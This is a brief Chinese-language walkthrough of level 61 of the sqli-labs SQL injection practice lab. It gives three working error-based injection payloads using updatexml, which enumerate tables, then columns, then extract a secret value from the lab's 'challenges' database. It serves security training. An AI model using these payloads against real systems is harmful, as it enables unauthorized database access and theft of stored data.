## sql-labs第六十一关

六十一关根据报错信息可知id参数是单引号加两个括号

![](./img/f197b6d2d20591434ea4dd23250a666f.png)



### 爆表

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
~~~

![](./img/Less-61-01.PNG)



### 爆列

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='1MPGCD92XR'),0x7e),1)--+
~~~

![](./img/Less-61-02.PNG)



### 爆数据

~~~ cmd
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_JS1S) from 1MPGCD92XR),0x7e),1)--+
~~~

![](./img/Less-61-03.PNG)

至此成功